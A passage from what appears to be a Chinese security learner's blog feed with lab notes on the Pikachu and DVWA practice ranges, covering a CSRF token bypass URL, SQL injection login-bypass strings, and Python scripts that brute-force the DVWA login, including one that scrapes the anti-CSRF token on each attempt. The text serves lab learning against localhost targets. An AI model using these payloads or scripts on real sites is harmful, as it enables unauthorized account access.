class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">       <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    &#125;   <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(<span class="number">10000</span>,<span class="number">99999</span>),<span class="literal">true</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于set_token函数是再修改个人信息页面中调用的，而且本题目是用的get方法提交所以我们只需要满足下列条件就可以成功：</p><ul><li><p>用户当前不在修改个人信息页面，也就是此时的token为空</p></li><li><p>用户登陆后访问url：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/PKQ/vul/csrf/csrftoken/token_get_edit.php?sex=123&amp;phonenum=666&amp;add=666&amp;email=666&amp;token=&amp;submit=submit</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230708/St2iv8rimage.256v8lzhtdmo.png"></p></li></ul><h2 id="CSRF安全措施"><a href="#CSRF安全措施" class="headerlink" title="CSRF安全措施"></a>CSRF安全措施</h2><ul><li>Token</li><li>验证码</li><li>校验原密码比如DVMA-Impossible</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pikachu靶场学习记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVMA靶场学习记录</title>
      <link href="/2023/07/06/DVMA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/07/06/DVMA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>先博而后约</p></blockquote><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h2><blockquote><ul><li>Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students &amp; teachers to learn about web application security in a controlled class room environment.</li><li>The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficultly, with a simple straightforward interface.    </li></ul></blockquote><h2 id="我的目标"><a href="#我的目标" class="headerlink" title="我的目标"></a>我的目标</h2><blockquote><ul><li>通过完成本靶场实验，快速入门常见Web安全漏洞类型。为了避免重复造轮子以及提升效率，本记录会比较简洁，尽量完成low\middle\high的难度，Impossible难度可以暂且略过或者看看思路以及为什么这样做就能达到安全的效果。预计五天时间完结？From 2023/7/7.</li></ul></blockquote><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li><p><a class="link" href="https://blog.csdn.net/m0_60884805/article/details/127086871">教程<i class="fas fa-external-link-alt"></i></a></p></li><li><p><a class="link" href="https://github.com/C2yb8er/DVWA">靶场下载地址(我fork了一份)<i class="fas fa-external-link-alt"></i></a></p></li></ul><h1 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h1><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="先用SQL注入试一下"><a href="#先用SQL注入试一下" class="headerlink" title="先用SQL注入试一下"></a>先用SQL注入试一下</h3><p>直接万能密码，考虑到是username注入应该是字符型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; # </span><br><span class="line">admin&#x27; and 1 = 1 # //这种跟第一种没有什么区别完全是浪费时间</span><br><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">//下面这种不能实现注入</span><br><span class="line">admin&#x27; or 1 = 1 # </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//失败</span><br><span class="line">admin&#x27; or 1 = 1 #</span><br><span class="line">SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;</span><br><span class="line">SELECT * FROM `users` WHERE user = &#x27;admin&#x27; or 1 = 1 #&#x27; AND password = &#x27;$pass&#x27;;</span><br><span class="line"></span><br><span class="line">//成功</span><br><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1 </span><br><span class="line">SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;</span><br><span class="line">SELECT * FROM `users` WHERE user = &#x27;admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27; AND password = &#x27;$pass&#x27;;</span><br></pre></td></tr></table></figure><p>到这里我在思考为什么<code>admin&#39; or 1 = 1 # </code>注入不成功？原来是下面这串代码给过滤了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get users details</span></span><br><span class="line">    <span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line">    <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Login successful</span></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Login failed</span></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br></pre></td></tr></table></figure><p>限制了结果只能返回一行数据，而用<code>admin&#39; or 1 = 1 #</code>会返回整个整个users表数据</p><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><blockquote><p>查看源码后发现爆破无任何限制，最轻松的爆破了。</p></blockquote><p>试试用Python和Brup两种方式吧：</p><h4 id="Brup"><a href="#Brup" class="headerlink" title="Brup"></a>Brup</h4><blockquote><p>抓了包才知道原来是Get请求，我还以为是Post</p><p>感觉简单的爆破的最高要求就是你的密码本</p></blockquote><p>交数据—&gt;抓包—&gt;Intruder—&gt;Add—&gt;Load密码本—&gt;Cluster bomb—&gt;Attack</p><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @C2yb8er modified from 国光</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">low_brute</span>():</span><br><span class="line">    url=<span class="string">&quot;http://localhost/DVWA/vulnerabilities/brute&quot;</span></span><br><span class="line">    cookies=&#123;</span><br><span class="line">        <span class="string">&#x27;security&#x27;</span>:<span class="string">&#x27;low&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;qpdonp68m7eho4okic8q05mm50&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            passwords = <span class="string">&#x27;&#x27;</span>.join(f.readlines()).split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        try_num = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> password <span class="keyword">in</span> passwords:</span><br><span class="line">            url = <span class="string">f&#x27;http://localhost/DVWA/vulnerabilities/brute/index.php?username=admin&amp;password=<span class="subst">&#123;password&#125;</span>&amp;Login=Login&#x27;</span></span><br><span class="line">            r = requests.get(url=url, cookies=cookies)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Welcome to the password protected area&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\n好耶！爆破成功！&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;username:admin \npassword:<span class="subst">&#123;password&#125;</span>\n&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;第<span class="subst">&#123;try_num&#125;</span>次爆破失败！&quot;</span>)</span><br><span class="line">                try_num = try_num + <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;文件读取异常&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><ul><li>增加了 SQL 过滤函数</li><li>增加了错误的等待时间(2秒)</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Login failed</span></span><br><span class="line"><span class="title function_ invoke__">sleep</span>( <span class="number">2</span> );</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    本质与Low爆破无差异</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>​    用前两关的方法都失效了，推测加入了一些机制来验证。</p><p>​    用Burp抓包发现出现了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_token=b26dfa0893d1c0f2a5eb93f1e72c5622</span><br></pre></td></tr></table></figure><p>​    而且每次user_token附带的值还不太一样，故推测是当用户提交一个登录请求后服务器会返回一个长达32位的随机字符串，也就是说你必须得需要在实现自动化爆破前获取这个随机的user_token。如果你始终用一个固定的user_token去请求访问，肯定是爆破不成功的。</p><p>​    查看源码探究一下<code>user_token</code>是怎么来的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//from high.php</span></span><br><span class="line"><span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line">--------------------</span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//from dvwaPage.inc.php</span></span><br><span class="line"><span class="comment">// Token functions --</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkToken</span>(<span class="params"> <span class="variable">$user_token</span>, <span class="variable">$session_token</span>, <span class="variable">$returnURL</span> </span>) </span>&#123;  <span class="comment"># Validate the given (CSRF) token</span></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$_DVWA</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="string">&quot;disable_authentication&quot;</span>, <span class="variable">$_DVWA</span>) &amp;&amp; <span class="variable">$_DVWA</span>[<span class="string">&#x27;disable_authentication&#x27;</span>]) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$user_token</span> !== <span class="variable">$session_token</span> || !<span class="keyword">isset</span>( <span class="variable">$session_token</span> ) ) &#123;</span><br><span class="line"><span class="title function_ invoke__">dvwaMessagePush</span>( <span class="string">&#x27;CSRF token is incorrect&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">dvwaRedirect</span>( <span class="variable">$returnURL</span> );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateSessionToken</span>(<span class="params"></span>) </span>&#123;  <span class="comment"># Generate a brand new (CSRF) token</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="title function_ invoke__">destroySessionToken</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ] = <span class="title function_ invoke__">md5</span>( <span class="title function_ invoke__">uniqid</span>() );</span><br><span class="line">    <span class="comment">//基于当前时间微秒级别的唯一标识符，然后通过 md5() 函数对其进行哈希处理，以获得一个固定长度的字符串表示会话令牌。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">destroySessionToken</span>(<span class="params"></span>) </span>&#123;  <span class="comment"># Destroy any session with the name &#x27;session_token&#x27;</span></span><br><span class="line"><span class="keyword">unset</span>( <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ] );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tokenField</span>(<span class="params"></span>) </span>&#123;  <span class="comment"># Return a field for the (CSRF) token</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;user_token&#x27; value=&#x27;<span class="subst">&#123;$_SESSION[ &#x27;session_token&#x27; ]&#125;</span>&#x27; /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// -- END (Token functions)</span></span><br></pre></td></tr></table></figure><h3 id="Python-1"><a href="#Python-1" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @C2yb8er modified from 国光</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_token</span>(<span class="params">cookies</span>):</span><br><span class="line">    index_url = <span class="string">&#x27;http://localhost/DVWA/vulnerabilities/brute/index.php&#x27;</span></span><br><span class="line">    index_html = requests.get(url=index_url, cookies=cookies, timeout=<span class="number">3</span>).text</span><br><span class="line">    token_pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;name=&quot;user_token&quot; value=&quot;(.*?)&quot;&#x27;</span>)</span><br><span class="line">    token = token_pattern.findall(index_html)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;获取token成功，值为<span class="subst">&#123;token&#125;</span>&quot;</span>,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">high_brute</span>(<span class="params">cookies</span>):</span><br><span class="line">    url=<span class="string">&quot;http://localhost/DVWA/vulnerabilities/brute&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            passwords = <span class="string">&#x27;&#x27;</span>.join(f.readlines()).split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        try_num = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> password <span class="keyword">in</span> passwords:</span><br><span class="line">            token = get_token(cookies)</span><br><span class="line">            url = <span class="string">f&#x27;http://localhost/DVWA/vulnerabilities/brute/index.php?username=admin&amp;password=<span class="subst">&#123;password&#125;</span>&amp;Login=Login&amp;user_token=<span class="subst">&#123;token&#125;</span>&#x27;</span></span><br><span class="line">            r = requests.get(url=url, cookies=cookies)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Welcome to the password protected area&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\n好耶！爆破成功！&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;username:admin \npassword:<span class="subst">&#123;password&#125;</span>\n&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;第<span class="subst">&#123;try_num&#125;</span>次爆破失败！&quot;</span>)</span><br><span class="line">                try_num = try_num + <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;文件读取异常&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookies=&#123;</span><br><span class="line">    <span class="string">&#x27;security&#x27;</span>: <span class="string">&#x27;high&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;qpdonp68m7eho4okic8q05mm50&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">high_brute(cookies)</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230706/St2iv8rimage.7bdic8sb7740.png"></p><p>​    我在思考，如果前端没有泄露这个<code>user_token</code>该怎么办？</p><p>补充相关知识：</p><h5 id><a href="#" class="headerlink" title="(.*?)"></a>(.*?)</h5><blockquote><p>正则表达式中的 <code>(.*?)</code> 用于匹配任意字符（除换行符外）的最短序列。在 <code>(.*?)</code> 的模式下，<code>?</code> 是一个非贪婪操作符，它告诉正则表达式引擎在匹配时使用最短的可能性。</p><p>在上述代码中，<code>(.*?)</code> 用于捕获 <code>value</code> 属性的值，即匹配 <code>value=&quot;...&quot;</code> 中的 <code>&quot;...&quot;</code> 部分。通过非贪婪操作符 <code>?</code>，正则表达式引擎会在遇到下一个字符（在此例中为双引号 <code>&quot;</code>）之前尽可能少地匹配字符，以确保匹配的是 <code>value</code> 属性的值，而不是包含其他字符的更长字符串。</p><p>因此，<code>(.*?)</code> 能够匹配 <code>value</code> 属性的值是因为它会尽可能少地匹配字符，直到遇到下一个字符为止，从而得到正确的值。</p></blockquote><h5 id="findall"><a href="#findall" class="headerlink" title="findall"></a>findall</h5><blockquote><p><code>findall</code> 是正则表达式对象的一个方法，用于在给定的字符串中搜索所有匹配模式的部分，并返回一个包含所有匹配结果的列表。它的语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.findall(pattern, string, flags=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>pattern</code>：要匹配的正则表达式模式。</li><li><code>string</code>：要搜索的字符串。</li><li><code>flags</code>（可选）：用于指定匹配模式的标志。常用的标志包括 <code>re.IGNORECASE</code>（忽略大小写）、<code>re.MULTILINE</code>（多行模式）等。</li></ul><p><code>findall</code> 方法会搜索整个字符串，找到所有符合模式的部分，并返回一个包含所有匹配结果的列表。每个匹配结果都以字符串的形式存储在列表中。</p></blockquote><h3 id="Burp"><a href="#Burp" class="headerlink" title="Burp"></a>Burp</h3><p><a class="link" href="https://www.cnblogs.com/chadlas/articles/15706231.html">跟着这个教程打了一遍<i class="fas fa-external-link-alt"></i></a><br><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230706/St2iv8rimage.4juwa2bow2y0.png"></p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><blockquote><p>审计一下源码吧！源码100行左右，是前面的两倍多，安全是有原因的哇！</p><p>SQL注入限制很强，账户锁定相关状态也是放在后端数据库的，账号登录密码错误超过了三次以上就会被锁住15分钟。</p><p>没有完全审计完搞懂，改天再看看。—from 2023/7/6</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) ) &#123;</span><br><span class="line"><span class="comment">// 同High</span></span><br><span class="line"><span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">//去除输入中的斜杠转义符 + 对用户名进行转义以防止潜在的 SQL 注入攻击</span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$user</span> );</span><br><span class="line"><span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//去除输入中的斜杠转义符 + 对用户名进行转义以防止潜在的 SQL 注入攻击</span></span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass</span> );</span><br><span class="line"><span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">//变态，只允许错误3次，超过就会锁定15分组</span></span><br><span class="line"><span class="variable">$total_failed_login</span> = <span class="number">3</span>; </span><br><span class="line"><span 